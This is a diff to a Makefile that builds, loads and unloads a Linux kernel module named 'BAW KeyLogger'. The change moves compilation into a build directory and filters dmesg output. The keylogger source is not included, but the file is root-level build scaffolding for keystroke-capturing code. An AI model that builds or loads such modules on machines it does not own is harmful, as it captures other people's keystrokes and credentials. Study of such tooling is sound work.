@@ -15,33 +15,38 @@ KERNEL_DIR := /lib/modules/$(KERNEL_VERSION)/build
 
 # Current directory
 PWD := $(shell pwd)
+BUILD_DIR := $(PWD)/build
 
 # Default target - build the module
 all:
 	@echo "Building BAW KeyLogger kernel module..."
 	@echo "Kernel version: $(KERNEL_VERSION)"
 	@echo "Kernel headers: $(KERNEL_DIR)"
-	$(MAKE) -C $(KERNEL_DIR) M=$(PWD) modules
+	@mkdir -p $(BUILD_DIR)
+	@cp keylogger.c $(BUILD_DIR)/
+	@echo "obj-m := keylogger.o" > $(BUILD_DIR)/Makefile
+	$(MAKE) -C $(KERNEL_DIR) M=$(BUILD_DIR) modules
+	@echo "Build complete! Module: $(BUILD_DIR)/keylogger.ko"
 
 # Clean target - remove compiled files
 clean:
 	@echo "Cleaning build files..."
-	$(MAKE) -C $(KERNEL_DIR) M=$(PWD) clean
+	@if [ -d "$(BUILD_DIR)" ]; then rm -rf $(BUILD_DIR); fi
 	rm -f *.o *.ko *.mod.c *.mod *.order *.symvers
 
 # Install target - load the module (requires root)
 install: all
 	@echo "Loading keylogger module (requires root privileges)..."
-	sudo insmod keylogger.ko
+	sudo insmod $(BUILD_DIR)/keylogger.ko
 	@echo "Module loaded! Check dmesg for output:"
-	dmesg | tail -10
+	dmesg | grep -i keylogger | tail -10
 
 # Uninstall target - unload the module (requires root)
 uninstall:
 	@echo "Unloading keylogger module (requires root privileges)..."
 	sudo rmmod keylogger
 	@echo "Module unloaded! Check dmesg for output:"
-	dmesg | tail -5
+	dmesg | grep -i keylogger | tail -5
 
 # Status target - check if module is loaded
 status:
